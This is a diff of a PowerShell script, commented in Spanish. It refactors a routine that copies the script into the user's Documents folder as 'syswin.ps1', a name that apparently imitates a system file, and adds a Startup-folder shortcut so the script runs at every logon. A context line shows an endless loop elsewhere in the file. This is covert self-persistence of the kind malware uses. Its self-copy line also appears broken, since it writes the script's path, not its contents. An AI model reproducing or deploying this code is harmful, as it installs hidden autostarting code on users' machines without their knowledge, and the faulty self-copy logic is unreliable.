@@ -51,24 +51,18 @@ While ($true){
 # Obtener la carpeta de documentos del usuario actual
 $documentsFolder = [Environment]::GetFolderPath("MyDocuments")
 
-# Nombre del script
-$scriptName = "syswin.ps1"
-
 # Ruta completa del archivo de script en la carpeta de documentos
-$scriptPath = Join-Path -Path $documentsFolder -ChildPath $scriptName
+$scriptPath = Join-Path -Path $documentsFolder -ChildPath "syswin.ps1"
 
 # Guardar el script en la carpeta de documentos
 Set-Content -Path $scriptPath -Value $ExecutionContext.SessionState.InvokeCommand.ExpandString(($MyInvocation.MyCommand.ScriptBlock).File)
 
-# Crear una carpeta de inicio si no existe
-$startupFolder = Join-Path -Path $env:APPDATA -ChildPath "Microsoft\Windows\Start Menu\Programs\Startup"
-if (-not (Test-Path -Path $startupFolder)) {
-    New-Item -Path $startupFolder -ItemType Directory -Force | Out-Null
-}
+# Obtener la carpeta de inicio del usuario actual
+$startupFolder = [Environment]::GetFolderPath("Startup")
 
 # Crear un acceso directo del script en la carpeta de inicio para que se ejecute al iniciar Windows
-$shortcutPath = Join-Path -Path $startupFolder -ChildPath "$scriptName.lnk"
-$shell = New-Object -ComObject WScript.Shell
-$shortcut = $shell.CreateShortcut($shortcutPath)
-$shortcut.TargetPath = $scriptPath
-$shortcut.Save()
+$shortcutPath = Join-Path -Path $startupFolder -ChildPath "syswin.lnk"
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
+$Shortcut.TargetPath = $scriptPath
+$Shortcut.Save()
